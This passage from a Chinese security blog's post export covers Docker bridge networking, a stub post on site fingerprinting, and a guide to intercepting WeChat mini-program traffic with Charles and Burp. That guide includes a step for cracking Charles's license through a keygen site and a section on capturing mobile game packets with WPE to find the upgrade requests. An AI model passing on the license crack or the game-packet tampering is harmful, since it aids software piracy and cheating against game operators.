<li><p><strong>增强网络性能</strong>：</p>
<ul>
<li>通过合理的桥接配置，可以减少网络中的广播域，从而减少网络拥塞，提高整体网络性能。</li>
</ul>
</li>
</ol>
<h4><span id="桥接网络的类型">桥接网络的类型</span></h4><p>桥接网络可以有多种配置方式，以下是几种常见的类型：</p>
<ol>
<li><p><strong>以太网桥接（Ethernet Bridging）</strong>：</p>
<ul>
<li>通过以太网桥将多个以太网段连接在一起，使它们成为一个逻辑上的单一网络。</li>
</ul>
</li>
<li><p><strong>无线桥接（Wireless Bridging）</strong>：</p>
<ul>
<li>使用无线设备（如无线接入点）将两个或多个无线网络段连接在一起，常用于扩展无线网络的覆盖范围。</li>
</ul>
</li>
<li><p><strong>混合桥接（Hybrid Bridging）</strong>：</p>
<ul>
<li>结合有线和无线桥接，将有线网络段和无线网络段连接在一起。</li>
</ul>
</li>
</ol>
<h4><span id="桥接网络的实现">桥接网络的实现</span></h4><p>桥接网络可以通过硬件设备或软件配置来实现：</p>
<ol>
<li><p><strong>硬件实现</strong>：</p>
<ul>
<li>使用专用的网络桥设备或交换机（具有桥接功能）来连接不同的网络段。</li>
</ul>
</li>
<li><p><strong>软件实现</strong>：</p>
<ul>
<li>在操作系统中使用虚拟桥接软件（如Linux的<code>brctl</code>工具或Windows的网络桥接功能）来实现桥接网络。</li>
</ul>
</li>
</ol>
<h4><span id="示例">示例</span></h4><p>假设有两个局域网（LAN），分别位于两个不同的楼层，每个楼层都有一个交换机连接所有的计算机。通过在两个交换机之间连接一个网络桥，可以使两个楼层的计算机互相通信，如同它们在同一个网络中一样。</p>
<h4><span id="总结">总结</span></h4><p>桥接网络是一种有效的网络配置方法，可以扩展网络的覆盖范围、连接不同类型的网络和增强网络性能。通过使用网络桥设备或软件实现桥接网络，可以将多个物理上分离的网络段连接在一起，形成一个逻辑上的统一网络。</p>
<p><strong>Docker 的 bridge 网络采用内置的 bridge 驱动，而 bridge 的底层采用的是</strong> <strong>Linux</strong> <strong>内核中 Linux bridge 技术</strong>（这意味着 bridge 是高性能并且是非常稳定的）。</p>
<h2><span id="桥接网络-for-docker">桥接网络 for Docker</span></h2><p>Docker 的 bridge 网络采用内置的 bridge 驱动，而 bridge 的底层采用的是 Linux 内核中 Linux bridge 技术（这意味着 bridge 是高性能并且是非常稳定的）。</p>
<p><strong>由于容器运行在自己单独的 network namespace 中，所以有单独的协议栈。</strong>容器中配置网关为 172.17.0.1，发出去的数据包<strong>先到达 br0</strong>，然后交给主机的协议栈，由于<strong>目的 IP 是外网 IP</strong>，且主机会开启 IP forward 功能，于是<strong>数据包通过主机的 eth0 发出去</strong>。由于 172.17.0.1 是内网 IP ，所以一般发出去之前会做 NAT 转换。由于要进过主机的协议栈并且要做 NAT 转换，所以性能上可能会差点，<strong>但是优点就是容器处于内网中，安全性相对要高点。</strong></p>
<p>默认情况下，创建的容器在没有使用 –network 参数指定要加入的 docker 网络时，默认都是加入 Docker 默认的单机桥接网络，也就是下面的 name 为 bridge 的网络。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker network ls</span><br><span class="line">NETWORK ID          NAME                DRIVER              SCOPE</span><br><span class="line">0dda6f303b8b        bridge              bridge              local</span><br></pre></td></tr></table></figure>

<h4><span id="创建新的单机桥接网络"><strong>创建新的单机桥接网络</strong></span></h4><p>使用 <code>docker network create</code> 命令，我们可创建一个名为 “localnet” 的单机桥接网络，并且在内核中还会多出一个新的 Linux 网桥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker network create -d bridge localnet</span><br><span class="line"></span><br><span class="line">$ docker network ls</span><br><span class="line">NETWORK ID          NAME                DRIVER              SCOPE</span><br><span class="line">			......</span><br><span class="line">f55943e20201        localnet            bridge              local</span><br></pre></td></tr></table></figure>

<p>在创建完之后，我们可以通过 brctl 工具来查看系统中的 Linux 网桥。可以看到，<strong>输出的内容中包含了两个网桥，docker0 是默认的 Docker bridge 网络所使用的网桥，br-f55943e20201 是 Docker localnet 网络所使用的网桥。</strong>这两个网桥目前都没有任何设备接入（看 interface 列）。这两个网桥所处的网段是不同的，</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240604084900918.png" alt="image-20240604084900918"></p>
<h4><span id="同个网络中的容器间通信"><strong>同个网络中的容器间通信</strong></span></h4><p>使用下面这条命令即可运行一个新的容器，并且让这个新容器加入到 localnet 这个网络中的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker container run -d --name demo1 --network localnet alpine sleep 3600</span><br></pre></td></tr></table></figure>

<p>我们查看网桥的情况，<strong>demo1</strong> 的网络接口连接到了网桥 br-f55943e20201 上，如图所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ brctl show</span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">br-f55943e20201 8000.02421d9aa3e1       no              vethf6a3fba</span><br><span class="line">docker0         8000.0242be6b61dc       no</span><br></pre></td></tr></table></figure>

<p>如果在<strong>相同的网络中继续接入新的容器，那么新接入的容器是可以通过 demo1 这个名称来 ping 通的</strong>。如下所示，我们创建了一个新的容器（demo2），并且在这个容器中直接 ping demo1 发现可以的 ping 通的。<strong>这是因为，demo2 运行了一个本地 DNS 解析器，该解析器会将该请求转发到 Docker 内部 DNS 服务器中。</strong>DNS 服务器中记录了容器启动时通过 –name 或者 –net-alias 参数指定的名称和容器之间的和映射关系。</p>
<h5><span id="详细解释">详细解释</span></h5><p>在你提供的例子中，<code>demo2</code> 容器中可以 <code>ping</code> 通 <code>demo1</code> 容器。这意味着 <code>demo2</code> 容器能够通过网络与 <code>demo1</code> 容器进行通信，<code>demo2</code> 可以成功发送 ICMP 回显请求数据包到 <code>demo1</code>，并接收到 <code>demo1</code> 的应答数据包。这种情况表明：</p>
<ol>
<li>两个容器处于同一个网络（如同一个 Docker 网络中）。</li>
<li>容器之间的 DNS 解析功能正常，<code>demo2</code> 能够通过容器名称 <code>demo1</code> 找到其对应的 IP 地址。</li>
<li>容器之间的网络连通性是正常的，没有防火墙等网络设备阻碍两者通信。</li>
</ol>
<p>下面是你提供的示例中的具体过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript复制代码# ping demo1</span><br><span class="line">PING demo1 (172.18.0.2): 56 data bytes</span><br><span class="line">64 bytes from 172.18.0.2: seq=0 ttl=64 time=0.230 ms</span><br><span class="line">64 bytes from 172.18.0.2: seq=1 ttl=64 time=0.161 ms</span><br></pre></td></tr></table></figure>

<p>在这个例子中：</p>
<ul>
<li>你在 <code>demo2</code> 容器中执行 <code>ping demo1</code> 命令。</li>
<li><code>demo2</code> 容器通过内部 DNS 解析 <code>demo1</code> 的名称并找到其 IP 地址 <code>172.18.0.2</code>。</li>
<li><code>demo2</code> 容器向 <code>172.18.0.2</code> 发送 ICMP 回显请求。</li>
<li><code>demo1</code> 容器接收到请求并返回 ICMP 回显应答。</li>
<li><code>demo2</code> 容器接收到应答，表明 <code>demo1</code> 容器是可达的，网络连通性正常。</li>
</ul>
<p>这就是为什么你可以在 <code>demo2</code> 中 <code>ping</code> 通 <code>demo1</code>。</p>
<hr>
<p>除此之外，我们可以看到 demo1 的 IP 地址是 172.18.0.2，这个与网桥 br-f55943e20201 是处于同一个网段内的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # ls</span><br><span class="line">bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var</span><br><span class="line">/ # ping demo1</span><br><span class="line">PING demo1 (172.18.0.2): 56 data bytes</span><br><span class="line">64 bytes from 172.18.0.2: seq=0 ttl=64 time=0.230 ms</span><br><span class="line">64 bytes from 172.18.0.2: seq=1 ttl=64 time=0.161 ms</span><br></pre></td></tr></table></figure>

<h4><span id></span></h4><h2><span id="ping的解释">ping的解释</span></h2><p>当然，以下是对 <code>ping</code> 命令作用以及 “ping 通” 解释的详细说明：</p>
<h3><span id="ping-命令的作用"><code>ping</code> 命令的作用</span></h3><p><code>ping</code>（Packet Internet Groper）是一个用于测试网络连接的命令行工具。其主要作用如下：</p>
<ol>
<li><p><strong>检测网络连通性</strong>：<code>ping</code> 可以用来检查一个设备是否能够与另一个设备进行网络通信。通过向目标地址发送ICMP（Internet Control Message Protocol）回显请求数据包，并等待回显应答来判断网络是否连通。</p>
</li>
<li><p><strong>测量网络延迟</strong>：<code>ping</code> 会显示从发送请求到接收应答所需的时间。这有助于测量网络的响应时间或延迟。</p>
</li>
<li><p><strong>诊断网络问题</strong>：通过观察 <code>ping</code> 的结果，可以帮助诊断网络中可能存在的问题。例如，如果 <code>ping</code> 不通，可能意味着网络不通、目标设备关闭或防火墙阻止了 ICMP 数据包。</p>
</li>
<li><h4><span id></span></h4></li>
</ol>
<h3><span id="ping-通-的解释">“ping 通” 的解释</span></h3><p>“ping 通” 指的是通过 <code>ping</code> 命令成功发送 ICMP 回显请求并收到目标设备的回显应答。这表明两个设备之间的网络连接正常，能够相互通信。具体来说：</p>
<ul>
<li>当你运行 <code>ping</code> 命令时，系统会向目标 IP 地址或域名发送 ICMP 回显请求数据包。</li>
<li>如果目标设备接收到这个数据包并回送一个回显应答数据包，那么 <code>ping</code> 命令就会在控制台上显示应答的信息，包括应答时间、数据包大小和 TTL（生存时间）。</li>
<li>多次 <code>ping</code> 通表示网络连接稳定，并且没有丢包或超时的情况。</li>
</ul>
<p>在你提供的示例中，<code>demo2</code> 容器通过 <code>ping demo1</code> 命令发送 ICMP 回显请求，并成功收到 <code>demo1</code> 容器的回显应答。这说明 <code>demo2</code> 和 <code>demo1</code> 之间的网络连接是正常的，可以相互通信。</p>
<h2><span id="暴露端口"><strong>暴露端口</strong></span></h2><p>同一个网络中的容器之间虽然可以互相 ping 通，但是并不意味着可以任意访问容器中的任何服务。Docker 为容器增加了一套安全机制，<strong>只有容器自身允许的端口，才能被其他容器所访问。如下所示，我们可以通过 <code>docker container ls</code> 命令可以看到容器暴露给其他容器访问的端口是 80，那么我们只能容器的 80 端口进行访问，而不能对没有开放的 22 端口进行访问。</strong></p>
<p>我们可以在<strong>镜像创建的时候定义要暴露的端口，也可以在容器创建时定义要暴露的端口</strong>，使用 –expose。如下所示，就额外暴露了 20、22 这两个端口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker container run -d --name web --expose 22 --expose 20 nginx</span><br><span class="line"></span><br><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">4749dac32711        nginx               &quot;/docker-entrypoint.…&quot;   12 seconds ago      Up 10 seconds       20/tcp, 22/tcp, 80/tcp   web</span><br></pre></td></tr></table></figure>

<h4><span id="端口映射"><strong>端口映射</strong></span></h4><p>上面提到的桥接网络中的容器只能与位于相同网络中的容器进行通信，假如一个容器想对外提供服务的话，需要进行端口映射。端口映射将容器的某个端口映射到 Docker 主机端口上。那么任何发送到该端口的流量，都会被转发到容器中。如图所示，容器内部开放端口为 80，该端口被映射到了 Docker 主机的 10.0.0.15 的 5000 端口上。最终访问 10.0.0.15:5000 的所有流量都会被转发到容器的 80 端口。</p>
<h3><span id="相关命令"><strong>相关命令</strong></span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 列出运行在本地 docker 主机上的全部网络</span><br><span class="line">docker network ls</span><br><span class="line"></span><br><span class="line"># 提供 Docker 网络的详细配置信息</span><br><span class="line">docker network inspect &lt;NETWORK_NAME&gt;</span><br><span class="line"></span><br><span class="line"># 创建新的单机桥接网络，名为 localnet，其中 -d 不指定的话，默认是 bridge 驱动。并且主机内核中也会创建一个新的网桥。</span><br><span class="line">docker network create -d bridge localnet</span><br><span class="line"></span><br><span class="line"># 删除 Docker 主机上指定的网络</span><br><span class="line">docker network rm</span><br><span class="line"></span><br><span class="line"># 删除主机上全部未使用的网络</span><br><span class="line">docker network prune</span><br><span class="line"></span><br><span class="line"># 运行一个新的容器，并且让这个容器加入 Docker 的 localnet 这个网络中</span><br><span class="line">docker container run -d --name demo1 --network localnet alpine sleep 3600</span><br><span class="line"></span><br><span class="line"># 运行一个新的容器，并且让这个容器暴露 22、20 两个端口</span><br><span class="line">docker container run -d --name web --expose 22 --expose 20 nginx</span><br><span class="line"></span><br><span class="line"># 运行一个新的容器，并且将这个容器的 80 端口映射到主机的 5000 端口</span><br><span class="line">docker container run -d --name web --network localnet -p 5000:80 nginx</span><br><span class="line"></span><br><span class="line"># 查看系统中的网桥</span><br><span class="line">brctl show</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>更底层的指纹收集</title>
    <url>/2024/07/23/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/</url>
    <content><![CDATA[<h1><span id="如读者有未授权渗透行为后果自负本站仅作学习用途">如读者有未授权渗透行为，后果自负，本站仅作学习用途</span></h1><h1><span id="更底层更曲线的指纹信息收集">更底层更曲线的指纹信息收集</span></h1><p>一个站点的指纹信息收集我们往往可以通过一些基本的数据包或者更改大小写路径得到，更简单更高效的方法还可以下一个wappalyzer插件，但其实这个并没有表面可视化那么轻松。</p>
<p>下面带来更底层更详细的指纹信息收集</p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>info</tag>
      </tags>
  </entry>
  <entry>
    <title>WX小程序抓包&amp;游戏封包技术</title>
    <url>/2024/07/14/%E6%89%8B%E6%9C%BA+charles+burpsuite%E9%85%8D%E5%90%88%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h1><span id="微信小程序x2f公众号抓包的主流方式">微信小程序&#x2F;公众号抓包的主流方式</span></h1><p>目前有以下几种：</p>
<p>1、Windows+Burp+Proxifier（配置困难，数据包卡顿)</p>
<p>2、Burp+安卓模拟器（模拟器卡顿）</p>
<p>3、Burp+Charles（本文测试，抓包完整，放包流畅）</p>
<p>一、下载</p>
<h4><span id="1-charles官网下载安装包">1、Charles官网下载安装包</span></h4><p><a href="https://www.charlesproxy.com/download/latest-release/">https://www.charlesproxy.com/download/latest-release/</a></p>
<h4><span id="2-burpsuite下载">2、Burpsuite下载</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/burp/releases</span><br></pre></td></tr></table></figure>

<h4><span id="3-charles破解">3、Charles破解</span></h4><p>进入链接，输入任意内容作为用户名，获取注册码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.zzzmode.com/mytools/charles/</span><br></pre></td></tr></table></figure>

<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
<h3><span id="二-charles设置">二、Charles设置</span></h3><h4><span id="1-charles设置代理">1、Charles设置代理</span></h4><p>打开工具栏中Proxy-Proxy Settings</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d8c24248e8ee40169178ecc42a62836f.png" alt="img"></p>
<p>设置为如下格式</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/03f1ce83357c4a478a1c23b3a573ef16.png" alt="img"></p>
<p>然后，抓取包的规则配置（*是代表抓取任意端口和域名，如果只抓取固定的端口or域名可自行设置。）</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/60e3b14ad74f45e2af485fd4a1d13c00.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/f844baa2145b4ce182af424db5651b7b.png" alt="img"></p>
<p>接下来配置Charles代理到burpsuit的规则（我这里偷懒，配置的burp默认的8080端口，为避免端口冲突，可自行想想1-65535之内的端口，与burp协同配置即可）</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/57635112886a4064955e578ed29e42b4.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/ee5d8a67623a4979a5b0bbaf772dde94.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41cb4950910e481c8ed2b31f31ed58d8.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4f367272290a44edac26e6f90f6286ea.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4fb4ca3b468a4e32a82bdf13c28f5091.png" alt="img"></p>
<h4><span id="2-关闭对windows端的抓包每次打开软件都是默认开启的记得关闭">2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）</span></h4><p>因为主要是联动手机对微信抓包，所以可以关闭windows端的抓包，避免干扰。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/a9aed4740923446fbb449694c92f5a13.png" alt="img"></p>
<h4><span id="3-配置pc端证书">3、配置PC端证书</span></h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/b5ef86e515634c1099c51d03f981eae0.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7f39dd9529940e59a8c97313062e2b9.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/e6604a88a8a44b6d9152d69c24520b1e.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7750c91696b40e9b555f08b270c0501.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/10cd0da8757444da9fd7ef640f1c2169.png" alt="img"></p>
<p>点击下一步，再点击完成，PC显示导入完成就完成PC端证书配置了。</p>
<h4><span id="4移动端证书配置我这里使用苹果手机测试">4.移动端证书配置（我这里使用苹果手机测试）</span></h4><p>在这里出现了两种可能性，依次进行即可：</p>
<h5><span id="41手机连接电脑热点并配置端口">4.1手机连接电脑热点，并配置端口</span></h5><p>开启电脑热点</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4c3aea78624043ee81d75414ffa5d693.png" alt="img"></p>
<p>手机连接热点，然后在Charles中进行如下操作：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/506f55c1d8b843bfaf4eff5c4f57a0e1.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/186401f5edfa444fbb4dcea3daf5b8de.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d754328f2a1f433a84ca9d9fd52be0f2.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41b6e5105fac43e8a77eaf56d2d422d6.jpeg" alt="img"></p>
<h5><span id="42证书下载后手机能直接识别">4.2证书下载后手机能直接识别</span></h5><p>在手机上使用chrome浏览器访问下面这个网址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chls.pro/ssl</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fcdc424fd5874c5d8af17e280e4dbff4.jpeg" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/64dae3270ca34e04adbefe605f610378.jpeg" alt="img"></p>
<p>在手机中的设置路径去设置证书：<strong>设置—&gt;通用—&gt;关于本机—&gt;证书信任设置</strong>中打开对根证书启用完全信任。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/7817da8b93ae48c2b33435669110182e.jpeg" alt="img"></p>
<p>所有的流程配置完成，现在就可以抓包了。</p>
<p>三、抓包<br>上面配置好了以后就可以开始抓包了，以后如果再有小程序、微信抓包需求直接进行以下流程即可。</p>
<p>1.打开Charles.</p>
<p>2.打开burp。on&#x2F;off拦截或者放包。</p>
<p>3.打开电脑热点，手机连接电脑热点。（如果生活中正常使用电脑热点记得把ip代理改回自动）</p>
<p>4.手机访问小程序或者公众号，在Charles和burp都可以看到包。</p>
<h3><span id="同样的-我们也可以在模拟器如此部署">同样的　我们也可以在模拟器如此部署</span></h3><p><a href="https://blog.csdn.net/weixin_43910861/article/details/123851267">burp+逍遥模拟器 app抓包 （导入证书到系统的解决方案）_逍遥导入证书失败-CSDN博客</a></p>
<h1><span id="游戏封包技术">游戏封包技术</span></h1><p>第一步：下载所需要的环境</p>
<p>雷电模拟器</p>
<p>雷电安卓模拟器-手游模拟器安卓版_android手机模拟器电脑版_雷电模拟器官网</p>
<p>ProxyDroid</p>
<p>链接：<a href="https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ">https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ</a>     提取码：s4ds </p>
<p>CCProxy+WPE</p>
<p>链接: <a href="https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q">https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q</a> 提取码: jti8 </p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704231129143.png" alt="img"></p>
<p>第二步：代理环境的配置</p>
<p>首先adb 命令查看自己的ip 在终端输入    ipconfig ,就可以查看到自己的ip, 我这里连接的是wifi,</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222428167.png" alt="img"></p>
<p>在雷电模拟器上打开安装好的  ProxyDroid.apk  ，将自己的电脑的 ip  填写在 HOST 里面，端口自己设置，不要超过 65535  ，</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fde7482c47e14fecaf60d1662b38aa16.png" alt="img"></p>
<p> 设置好 之后  再将上面 这个开关打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2ecd9200873346db9206fdb169b8981b.png" alt="img"></p>
<p>然后 在pc 端打开 CCProxy, 打开设置，端口  是 上面 app  里面填写的端口，IP 和代理app 的保持一直 都是自己电脑上的ip 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222522362.png" alt="img"></p>
<p>在点击下面的   高级   ，把ip改成和自己电脑的一至，再点击确定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222527721.png" alt="img"></p>
<p>ccproxy 还要开启账户里面的允许所有。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704230543369.png" alt="img"></p>
<p>我们再打开模拟器上的游戏，看到ccp 中有这样一条线，就能看到代理成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222548577.png" alt="img"></p>
<p>接下来我们就打开 ，WPE , 在目标程序中找到ccp 的进程。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222608143.png" alt="img"></p>
<p>在视图里面可以设置 拦截发送的数据包，还是接受到的数据包，我这里只拦截发送的数据包。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2021060522262510.png" alt="img"></p>
<p>设置好之后，我们进入游戏，找到游戏的中角色的升级，我们打开wpe, 点击 黑色的运行按钮，我们就能看到扇形的数据包中开始变化，点击一次升级，我们就暂停拦截，我们就取分析，拦截到的数据包，在如下的列表中我们可以很快浏览一下，我们 找到规律了，  </p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222656425.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222711573.png" alt="img"></p>
<p>总结： 我们设置的ip: 172.20.4.153  我们现在就查看，只要来源和目标 ip 都是一样的。这就说明是本地和本地的发送，我们就将这些直接过滤掉， 我们剩下的也不多，就一个一个的试试，</p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>pr0gram</tag>
      </tags>
  </entry>
</search>
